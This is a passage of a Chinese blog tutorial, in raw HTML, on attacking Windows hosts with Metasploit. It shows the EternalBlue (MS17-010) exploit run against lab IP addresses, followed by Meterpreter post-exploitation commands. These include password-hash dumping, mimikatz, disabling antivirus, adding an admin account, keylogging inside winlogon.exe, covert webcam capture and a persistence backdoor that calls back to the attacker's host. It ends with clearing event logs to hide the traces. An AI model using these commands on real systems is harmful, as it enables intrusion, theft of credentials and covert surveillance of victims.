number">80</span>端口上的流量太多了反向连接使用场景：我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。反向连接<span class="token number">80</span>和<span class="token number">443</span>端口使用场景：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的<span class="token number">80</span>端口或<span class="token number">443</span>端口与外部通信<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>Meterpreter属于<strong>stage payload</strong>，在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。</p><p>Meterpreter是如何工作的？</p><p>首先目标先要执行初始的溢出漏洞会话连接，可能是 bind正向连接，或者反弹 reverse 连接。反射连接的时候加载dll链接文件，同时后台悄悄处理 dll 文件。其次Meterpreter核心代码初始化,通过 socket套接字建立一个TLS&#x2F;1.0加密隧道并发送GET请求给Metasploit服务端。Metasploit服务端收到这个GET请求后就配置相应客户端。最后，Meterpreter加载扩展，所有的扩展被加载都通过TLS&#x2F;1.0进行数据传输。</p><p>Meterpreter的特点：</p><ul><li>Meterpreter完全驻留在内存，没有写入到磁盘</li><li>Meterpreter注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程</li><li>默认情况下， Meterpreter的通信是加密的，所以很安全</li><li>扩展性，许多新的特征模块可以被加载。</li></ul><p>我们在设置 payloads 时，可以将 payloads 设置为：windows&#x2F;meterpreter&#x2F;reverse_tcp ，然后获得了 meterpreter&gt; 之后我们就可以干很多事了！具体的做的事，在我们下面的后渗透阶段都有讲！</p><h2 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17_010(永恒之蓝)"></a>MS17_010(永恒之蓝)</h2><p>我们现在模拟使用 MS17_010 漏洞攻击，这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞。</p><p>kali控制台输入：msfconsole 进入metasploit框架</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078958594-9ed7369b-8557-4776-aabb-f6ce6d564da8.png" alt="img">寻找MS17_010漏洞： search ms17_010 </p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078973904-1cc9d651-d3a4-4e92-ac5f-5b7d480df13f.png" alt="img"><br>这里找到了两个模块，第一个<strong>辅助模块</strong>是探测主机是否存在MS17_010漏洞，第二个是<strong>漏洞利用模块</strong>，我们先探测哪些主机存在漏洞 </p><h3 id="Auxiliary辅助探测模块"><a href="#Auxiliary辅助探测模块" class="headerlink" title="Auxiliary辅助探测模块"></a>Auxiliary辅助探测模块</h3><p>该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p><p>输入命令：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079000005-3e056e11-c929-4403-822a-0fcf692da134.png" alt="img">查看这个模块需要配置的信息：show options</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079023419-e14da977-dea6-48ee-b1b4-cadd5d2165fc.png" alt="img"><br>RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</p><p>输入：set RHOSTS 192.168.125.125-129.168.125.140</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078769784-651af628-c4d2-491e-9f88-42fc899a1b9b.png" alt="img"></p><p>输入：exploit 攻击，这里有+号的就是可能存在漏洞的主机，这里有3个主机存在漏洞</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079083222-93acf79b-cda0-4373-806d-ee0c8700c7fc.png" alt="img"></p><h3 id="Exploit漏洞利用模块"><a href="#Exploit漏洞利用模块" class="headerlink" title="Exploit漏洞利用模块"></a>Exploit漏洞利用模块</h3><p>然后我们就可以去利用漏洞攻击了，选择漏洞攻击模块： use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </p><p>查看这个漏洞的信息：info</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079088706-991a3487-a8ce-4de8-bda3-98f6db2dff0b.png" alt="img"><br>查看可攻击的系统平台，这个命令显示该攻击模块针对哪些特定操作系统版本、语言版本的系统：show targets</p><p>这里只有一个，有些其他的漏洞模块对操作系统的语言和版本要求的很严，比如MS08_067，这样就要我们指定目标系统的版本的。如果不设置的话，MSF会自动帮我们判断目标操作系统的版本和语言(利用目标系统的指纹特征)</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078773007-87af7563-298b-46bf-8ebc-22cb06e51cf1.png" alt="img"></p><h3 id="Payload攻击载荷模块"><a href="#Payload攻击载荷模块" class="headerlink" title="Payload攻击载荷模块"></a>Payload攻击载荷模块</h3><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p><p>查看攻击载荷：show payloads</p><p>该命令可以查看当前漏洞利用模块下可用的所有Payload</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078771541-40e9236b-8948-4d37-badf-a6808a48fba3.png" alt="img"></p><p>设置攻击载荷：set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078771854-e4abb27e-743e-4a73-b92c-5ab60379dd47.png" alt="img"></p><p>查看模块需要配置的参数： show options</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079126313-9c273ce6-4b21-46e4-b92a-cb28716c462b.png" alt="img"></p><p>设置RHOST，也就是要攻击主机的ip：set RHOST 192.168.125.138</p><p>设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell：set LHOST 192.168.125.129</p><p>如果我们这里不设置lport的话，默认是4444端口监听</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078773488-028392b7-0d69-4388-b99e-63f91ea35d0b.png" alt="img"></p><p>攻击： exploit </p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079131587-d189fd84-47e1-496f-9f18-e1252d48a8f0.png" alt="img"></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>运行了exploit命令之后，我们开启了一个reverse TCP监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 meterpreter &gt; 出现，我们输入： shell 即可切换到目标主机的windows shell，要想从目标主机shell退出到 meterpreter ，我们只需输入：exit</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079162991-b4890595-349b-4404-b3d4-9f2f3d6ce53c.png" alt="img"></p><p>我们要想从 meterpreter 退出到MSF框架，输入：background</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079181975-b19d2875-cbd0-4396-bea6-4c6e1fcb60c0.png" alt="img"><br>输入： sessions -l 查看我们获得的shell，前面有id</p><p>输入： sessions -i 1 即可切换到id为1的shell</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078774547-eeaab652-fa7c-4fb4-a23b-97522c63e963.png" alt="img"></p><p>输入：shell 即可进入 cmd 类型的控制，再输入：powershell ，即可进入 powershell 类型的控制台</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078775696-62f88276-f870-46ed-a0c9-d560c513c74a.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">sysinfo             <span class="token comment">#查看目标主机系统信息</span>run scraper         <span class="token comment">#查看目标主机详细信息</span>run hashdump        <span class="token comment">#导出密码的哈希</span>load kiwi           <span class="token comment">#加载mimikatz</span>ps                  <span class="token comment">#查看目标主机进程信息</span>pwd                 <span class="token comment">#查看目标当前目录(windows)</span>getlwd              <span class="token comment">#查看目标当前目录(Linux)</span>search <span class="token operator">-</span>f <span class="token operator">*</span><span class="token punctuation">.</span>jsp <span class="token operator">-</span>d e<span class="token punctuation">:</span>\                <span class="token comment">#搜索E盘中所有以.jsp为后缀的文件</span>download  e<span class="token punctuation">:</span>\test<span class="token punctuation">.</span>txt  <span class="token operator">/</span>root          <span class="token comment">#将目标机的e:\test.txt文件下载到/root目录下</span>upload    <span class="token operator">/</span>root<span class="token operator">/</span>test<span class="token punctuation">.</span>txt d<span class="token punctuation">:</span>\test      <span class="token comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span>getpid              <span class="token comment">#查看当前Meterpreter Shell的进程PID</span>migrate <span class="token number">1384</span>        <span class="token comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span>idletime            <span class="token comment">#查看主机运行时间</span>getuid              <span class="token comment">#查看获取的当前权限</span>getsystem           <span class="token comment">#提权,获得的当前用户是administrator才能成功</span>run  killav         <span class="token comment">#关闭杀毒软件</span>screenshot          <span class="token comment">#截图</span>webcam_list         <span class="token comment">#查看目标主机的摄像头</span>webcam_snap         <span class="token comment">#拍照</span>webcam_stream       <span class="token comment">#开视频</span>execute  参数  <span class="token operator">-</span>f 可执行文件   <span class="token comment">#执行可执行程序</span>run getgui <span class="token operator">-</span>u hack <span class="token operator">-</span>p <span class="token number">123</span>    <span class="token comment">#创建hack用户，密码为123</span>run getgui <span class="token operator">-</span>e                <span class="token comment">#开启远程桌面</span>keyscan_start                <span class="token comment">#开启键盘记录功能</span>keyscan_dump                 <span class="token comment">#显示捕捉到的键盘记录信息</span>keyscan_stop                 <span class="token comment">#停止键盘记录功能</span>uictl  disable  keyboard     <span class="token comment">#禁止目标使用键盘</span>uictl  enable   keyboard     <span class="token comment">#允许目标使用键盘</span>uictl  disable  mouse        <span class="token comment">#禁止目标使用鼠标</span>uictl  enable   mouse        <span class="token comment">#允许目标使用鼠标</span>load                         <span class="token comment">#使用扩展库</span>run             <span class="token comment">#使用扩展库</span>run persistence <span class="token operator">-</span>X <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>p <span class="token number">8888</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.27</span>        <span class="token comment">#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span>portfwd add <span class="token operator">-</span>l <span class="token number">3389</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.11</span><span class="token number">.13</span> <span class="token operator">-</span>p <span class="token number">3389</span>     <span class="token comment">#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span>clearev                       <span class="token comment">#清除日志</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h3><p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>migrate           <span class="token comment">#自动进程迁移</span>run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>checkvm           <span class="token comment">#查看目标主机是否运行在虚拟机上</span>run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>killav            <span class="token comment">#关闭杀毒软件</span>run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>enable_rdp        <span class="token comment">#开启远程桌面服务</span>run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>autoroute         <span class="token comment">#查看路由信息</span>run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_logged_on_users    <span class="token comment">#列举当前登录的用户</span>run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_applications       <span class="token comment">#列举应用程序</span>run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>credentials<span class="token operator">/</span>windows_autologin <span class="token comment">#抓取自动登录的用户名和密码</span>run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>smart_hashdump               <span class="token comment">#dump出所有用户的hash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入：sysinfo 查看目标主机的信息</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078775312-d3f47c3f-a73c-4e7b-ab14-a9ad2572c670.png" alt="img"></p><h3 id="查看主机是否运行在虚拟机上"><a href="#查看主机是否运行在虚拟机上" class="headerlink" title="查看主机是否运行在虚拟机上"></a>查看主机是否运行在虚拟机上</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>checkvm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078776010-73c4ad13-dd9b-4af5-a50e-899aacdd56b7.png" alt="img"></p><h3 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h3><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">run  killav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078777810-d99a0dfb-89a3-4c47-a692-55c7bf70bf6e.png" alt="img"></p><h3 id="获取目标主机的详细信息"><a href="#获取目标主机的详细信息" class="headerlink" title="获取目标主机的详细信息"></a>获取目标主机的详细信息</h3><p>使用命令：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">run scraper <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它将目标机器上的常见信息收集起来然后下载保存在本地</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078794399-39d79d8a-57de-466d-b4f8-3d7c26517cc0.png" alt="img"></p><h3 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h3><p>Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下：</p><ul><li>cd：切换目标目录；</li><li>cat：读取文件内容；</li><li>rm：删除文件；</li><li>edit：使用vim编辑文件</li><li>ls：获取当前目录下的文件；</li><li>mkdir：新建目录；</li><li>rmdir：删除目录；</li></ul><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079267383-0ab3d680-208d-4268-b854-baf493a43da2.png" alt="img"></p><h3 id="上传-x2F-下载文件"><a href="#上传-x2F-下载文件" class="headerlink" title="上传&#x2F;下载文件"></a>上传&#x2F;下载文件</h3><ul><li>download file 命令可以帮助我们从目标系统中下载文件</li><li>upload file 命令则能够向目标系统上传文件。</li></ul><h3 id><a href="#" class="headerlink" title></a><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079273047-f036875b-82ba-468c-94e6-534c402c29ac.png" alt="img"></h3><p>权限提升</p><p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个getsystem 命令，它可以使用多种技术在目标系统中实现提权：</p><p>getuid 命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为 NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</p><p>注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078779230-daa3e05c-2119-45cb-a8f0-e4b9705b8cda.png" alt="img"></p><h3 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h3><p>传送门：<a href="https://xie1997.blog.csdn.net/article/details/105815134">MSF中获取用户密码</a></p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>先查看目标主机安装了哪些应用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078783102-ef43e4f3-5708-4ac0-ab9a-3d5b3d8ed515.png" alt="img"></p><p>我们还可以使用 execute 命令在目标系统中执行应用程序。这个命令的使用方法如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">execute  参数  <span class="token operator">-</span>f 可执行文件  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行后它将执行所指定的命令。可选参数如下：</p><ul><li>-f：指定可执行文件</li><li>-H：创建一个隐藏进程</li><li>-a：传递给命令的参数</li><li>-i： 跟进程进行交互</li><li>-m：从内存中执行</li><li>-t： 使用当前伪造的线程令牌运行进程</li><li>-s： 在给定会话中执行进程</li></ul><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078782626-a8e1c640-db76-438c-a2da-8767e20db925.png" alt="img"></p><h3 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h3><p>输入：screenshot ，截图目标主机屏幕，可以看到，图片被保存到了 &#x2F;root 目录下</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078781022-dee60995-881b-4564-bd8a-080ca83ad47b.png" alt="img"></p><h3 id="创建一个新账号"><a href="#创建一个新账号" class="headerlink" title="创建一个新账号"></a>创建一个新账号</h3><p>先查看目标主机有哪些用户</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_logged_on_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078788166-a319bb4f-4f5a-4cd7-8ef7-d125a2ac4e18.png" alt="img"></p><p>接下来，我们可以在目标系统中创建一个新的用户账号：run getgui -u hack -p 123，这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。</p><p>这里成功创建了用户，但是添加到Administrators组中失败了 !</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079330574-f45269c0-670f-46c6-b8da-9b1207042581.png" alt="img"><br>如果添加到Administrators组中失败了的话，我们可以运行：shell ，进行cmd窗口手动将该用户添加到administrators组中。</p><h3 id="启用远程桌面"><a href="#启用远程桌面" class="headerlink" title="启用远程桌面"></a>启用远程桌面</h3><p>当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p><p>首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），不过我们的 getgui 脚本可以帮我们搞定。我们可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启），我们输入：run getgui -e 或者 run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</p><p>在开启远程桌面会话之前，我们还需要使用“idletime”命令检查远程用户的空闲时长： idletime</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078791320-ae7b693f-e3e7-4819-8d7a-c7b09cc92537.png" alt="img"></p><p>然后我们就可以使用远程桌面用我们创建的用户远程登录目标主机了。由于上一步创建的用户没有被添加到远程桌面用户组中，所以这一步就没法演示。 </p><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p><ul><li>keyscan_start：开启键盘记录功能</li><li>keyscan_dump：显示捕捉到的键盘记录信息</li><li>keyscan_stop：停止键盘记录功能</li></ul><p>不过在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录 </p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。</p><p>在下面的例子中，我们会将Meterpreter跟 winlogon.exe 绑定，并在登录进程中捕获键盘记录，以获得用户的密码。</p><p>首先，我们需要使用： ps 命令查看目标设备中运行的进程：</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078785138-2c9ce33a-4430-4a7b-bfd5-b581c546b3ec.png" alt="img"></p><p>我们可以使用： getpid 查看我们当前的进程id</p><p>使用： migrate 目标进程ID 命令来绑定目标进程id，这里绑定目标pid的时候，经常会断了 shell。进程迁移后会自动关闭原来进程，没有关闭可使用 kill pid 命令关闭进程。或者使用自动迁移进程（run post&#x2F;windows&#x2F;manage&#x2F;migrate）命令，系统会自动寻找合适的进程然后迁移。</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079415897-1bb09b2e-9083-45f7-8c54-1d79ff6ff047.png" alt="img"></p><p>绑定完成之后，我们就可以开始捕获键盘数据了，可以看到，用户输入了 123 然后回车，说明密码是 123</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078787502-f0560951-2297-402c-b330-fdaec86c541e.png" alt="img"></p><h3 id="禁止目标主机使用键盘鼠标"><a href="#禁止目标主机使用键盘鼠标" class="headerlink" title="禁止目标主机使用键盘鼠标"></a>禁止目标主机使用键盘鼠标</h3><ul><li>禁止(允许)目标使用键盘： uictl disable (enable) keyboard</li><li>禁止(允许)目标使用鼠标： uictl disable (enable) mouse</li></ul><h3 id="用目标主机摄像头拍照"><a href="#用目标主机摄像头拍照" class="headerlink" title="用目标主机摄像头拍照"></a>用目标主机摄像头拍照</h3><ul><li>获取目标系统的摄像头列表：webcam_list</li><li>从指定的摄像头，拍摄照片：webcam_snap</li><li>从指定的摄像头，开启视频：webcam_stream</li></ul><p>可以看到啊，目标主机有一个摄像头</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078791387-aa2f942f-f921-4cc9-8c54-153ea9d3fd80.png" alt="img"></p><p>于是，我们拍一张照片看看，可以看到，已经拍完了照，并且显示出来了</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078794382-bc328e2d-af62-44d2-9c05-59e36c4cd6ee.png" alt="img"></p><p>我们再来开启视频试试，开启摄像头拍摄视频。他会弹出一个网页，可以查看到摄像头那端的实时操作，相当于直播</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078801019-de3b995d-7d46-4a00-b19f-40058c3c64d9.png" alt="img"></p><h3 id="使用扩展库"><a href="#使用扩展库" class="headerlink" title="使用扩展库"></a>使用扩展库</h3><p>输入 load 或者 run 然后双击table</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078802141-2aacfb8b-3dc9-4552-9d2d-b5a5f0cfa286.png" alt="img"></p><h3 id="生成持续性后门"><a href="#生成持续性后门" class="headerlink" title="生成持续性后门"></a>生成持续性后门</h3><p>因为 meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。</p><p>建立持续性后门有两种方法，一种是通过<strong>启动项启动(persistence) ，</strong>一种是通过 <strong>服务启动(metsvc)</strong></p><p><strong>启动项启动</strong></p><p>启动项启动的话，我们先生成一个后门工具，传送门——&gt; <a href="https://blog.csdn.net/qq_36119192/article/details/83869141">用MSF生成一个后门木马</a></p><p>然后放到windows的启动目录中：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">C<span class="token punctuation">:</span>\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。</p><p><strong>服务启动</strong></p><p>通过服务启动，我们可以运行命令 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">run persistence <span class="token operator">-</span>X <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>p <span class="token number">8888</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.27</span>  <span class="token comment">#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><span class="token comment">#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078796450-76bebe45-bbd4-431a-a460-cca851fc2914.png" alt="img">我们在被攻击机可以看到这个文件，是一个VBScript脚本</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078796264-3a17247c-6b1b-463e-97ae-9b19e5790b70.png" alt="img"></p><p>查看靶机的端口连接情况，可以看到靶机连着我们的8888端口</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078796363-984c9dd7-cb82-436b-adde-1c6786e571c5.png" alt="img"></p><h3 id="设置Socks代理"><a href="#设置Socks代理" class="headerlink" title="设置Socks代理"></a>设置Socks代理</h3><p>传送门：<a href="https://xie1997.blog.csdn.net/article/details/105872076">MSF搭建socks代理</a></p><h3 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h3><p>portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">portfwd add <span class="token operator">-</span>l <span class="token number">3389</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.11</span><span class="token number">.13</span> <span class="token operator">-</span>p <span class="token number">3389</span>     <span class="token comment">#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078801409-5ae25a7c-8f76-4bf7-bbf9-771cea414aa3.png" alt="img"></h3><p>然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rdesktop <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">3389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078800650-954c464c-fb32-404f-8e9c-ffef3af624de.png" alt="img"></p><h3 id="清除事件日志"><a href="#清除事件日志" class="headerlink" title="清除事件日志"></a>清除事件日志</h3><p>完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令 clearev 命令来清除事件日志：</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635079508696-dd383299-2766-4f60-9661-c0a9f07ec885.png" alt="img"></p><h2 id="导入并执行PowerShell脚本"><a href="#导入并执行PowerShell脚本" class="headerlink" title="导入并执行PowerShell脚本"></a>导入并执行PowerShell脚本</h2><p>如果powershell脚本是用于域内信息收集的，则获取到的权限用户需要是域用户</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">load powershell            <span class="token comment">#加载powershell功能</span>powershell_import <span class="token operator">/</span>root<span class="token 